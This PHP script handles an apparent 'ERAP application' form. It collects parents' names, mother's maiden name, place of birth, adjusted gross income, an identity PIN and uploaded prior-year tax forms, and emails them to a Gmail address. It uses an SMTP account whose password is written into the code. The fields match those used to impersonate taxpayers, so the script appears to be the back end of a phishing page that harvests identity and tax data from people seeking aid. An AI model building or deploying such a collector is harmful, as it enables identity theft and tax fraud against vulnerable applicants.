<?php
declare(strict_types=1);

use Earnest\Mail\SimpleSMTPMailer;

require_once __DIR__ . '/lib/SimpleSMTPMailer.php';

$smtpConfig = [
    'host'       => 'smtp.hostinger.com',
    'port'       => 465,
    'username'   => 'contact@earnestexpressllc.com',
    'password'   => 'Weareallmad123@',
    'encryption' => 'ssl',
    'from_email' => 'contact@earnestexpressllc.com',
    'from_name'  => 'Erap application',
    'to_emails'  => ['earnestexpress12@gmail.com'],
];

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('Location: ../index.html');
    exit();
}

$clean = static function ($value): string {
    $value = is_string($value) ? $value : (string) $value;
    $value = preg_replace('/[\\x00-\\x1F\\x7F]/u', '', $value);
    return trim($value);
};

$fatherName   = $clean($_POST['urs_father_name'] ?? '');
$motherName   = $clean($_POST['urs_mother_name'] ?? '');
$maidenName   = $clean($_POST['urs_maiden_name'] ?? '');
$otherContact = $clean($_POST['urs_other_contact'] ?? '');
$birthPlace   = $clean($_POST['urs_birth_place'] ?? '');
$agi          = $clean($_POST['urs_agi'] ?? '');
$identityPin  = $clean($_POST['urs_identity_pin'] ?? '');

$fields = [
    "FATHER NAME" => $fatherName,
    "MOTHER NAME" => $motherName,
    "MOTHER MAIDEN NAME" => $maidenName,
    "OTHER CONTACT NAME" => $otherContact,
    "PLACE OF BIRTH" => $birthPlace,
    "ADJUSTED GROSS INCOME / BGI" => $agi,
    "IDENTITY PIN" => $identityPin,
];

$required = [$fatherName, $motherName, $birthPlace, $identityPin];
if (in_array('', $required, true)) {
    echo "<h1>Submission Error</h1><p>Please complete all required fields.</p><a href='../erap-urs-details.html'>Go Back</a>";
    exit();
}

$safe = static function ($value): string {
    return htmlspecialchars((string)$value, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
};

$rowsHtml = '';
foreach ($fields as $label => $value) {
    $rowsHtml .= '<tr><th style="text-align:left;padding:6px 10px;background:#f5f5f5;width:220px;font-family:Arial,sans-serif;">'
        . $safe($label) . '</th><td style="padding:6px 10px;font-family:Arial,sans-serif;">' . nl2br($safe($value)) . '</td></tr>';
}

$htmlBody = '<h2 style="font-family:Arial,sans-serif;margin-bottom:12px;">URS Supplemental Intake</h2>'
    . '<p style="font-family:Arial,sans-serif;margin:0 0 12px;">Additional URS details were submitted. Information is below.</p>'
    . '<table style="border-collapse:collapse;width:100%;max-width:720px;font-size:14px;">' . $rowsHtml . '</table>';

$textLines = [];
foreach ($fields as $label => $value) {
    $textLines[] = $label . ': ' . $value;
}
$textBody = "URS Supplemental Intake\n\n" . implode("\n", $textLines);

$attachments = [];
$maxFileSize = 5 * 1024 * 1024; // 5 MB per file
if (isset($_FILES['urs_prior_year_form'])) {
    $fileData = $_FILES['urs_prior_year_form'];
    if (is_array($fileData['tmp_name'])) {
        foreach ($fileData['tmp_name'] as $idx => $tmpName) {
            if ($tmpName && ($fileData['error'][$idx] ?? UPLOAD_ERR_OK) === UPLOAD_ERR_OK) {
                if (($fileData['size'][$idx] ?? 0) > $maxFileSize) {
                    echo "<h1>Submission Error</h1><p>Each upload must be 5MB or less. Please resize or compress your files.</p><a href='../erap-urs-details.html'>Go Back</a>";
                    exit();
                }
                $attachments[] = ['path' => $tmpName, 'name' => $fileData['name'][$idx] ?? ('Prior-Year-Form-' . $idx)];
            }
        }
    } elseif (!empty($fileData['tmp_name']) && ($fileData['error'] ?? UPLOAD_ERR_OK) === UPLOAD_ERR_OK) {
        if (($fileData['size'] ?? 0) > $maxFileSize) {
            echo "<h1>Submission Error</h1><p>Each upload must be 5MB or less. Please resize or compress your files.</p><a href='../erap-urs-details.html'>Go Back</a>";
            exit();
        }
        $attachments[] = ['path' => $fileData['tmp_name'], 'name' => $fileData['name'] ?? 'Prior-Year-Form'];
    }
}

try {
    $mailer = new SimpleSMTPMailer(
        $smtpConfig['host'],
        (int)$smtpConfig['port'],
        $smtpConfig['username'],
        $smtpConfig['password'],
        $smtpConfig['encryption']
    );

    $mailer->send(
        $smtpConfig['from_email'],
        $smtpConfig['from_name'],
        $smtpConfig['to_emails'] ?? ($smtpConfig['to_email'] ?? ''),
        "URS Supplemental Intake",
        $htmlBody,
        $textBody,
        $attachments
    );
} catch (\Throwable $exception) {
    error_log('[URS] Mail send failed: ' . $exception->getMessage());
    echo "<h1>Submission Error</h1>";
    echo "<p>We were unable to process your URS details at this time. Please contact support.</p>";
    echo "<pre>" . htmlspecialchars($exception->getMessage(), ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . "</pre>";
    echo "<a href='../erap-urs-details.html'>Go Back</a>";
    exit();
}

header("Location: ../success.html");
exit();
